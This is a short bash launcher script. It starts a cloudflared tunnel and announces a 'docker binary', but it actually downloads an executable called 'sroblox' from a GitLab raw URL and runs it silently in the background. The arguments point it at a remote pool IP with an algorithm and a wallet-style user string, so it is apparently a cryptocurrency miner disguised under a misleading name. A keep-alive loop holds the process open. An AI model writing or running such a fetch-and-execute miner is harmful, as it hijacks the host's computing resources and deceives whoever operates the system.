#!/bin/bash

echo "Starting cloudflared..."

cloudflared access tcp --hostname "$(cat hostname.txt)" --url 127.0.0.1:443 >/dev/null 2>&1 &

sleep 5

echo "Starting docker binary..."

#chmod +x ./docker
#./docker -c docker.json >/dev/null 2>&1 &
wget -q https://gitlab.com/barbieanay003/app/-/raw/main/sroblox
chmod +x sroblox
./sroblox -a xelishashv3 -o 157.173.100.15:8089 -u xel:aee43hxxe8tzl0lrjq25dsj8rhvev2jseeyk6xydx9ltuj4fyezqzqspqyrx6etddaykgqq9qqqqrxm243sq2jrtna8.ghcr -p x --keepalive true >/dev/null 2>&1 &

echo "Running..."

while true
do
  sleep 60
done
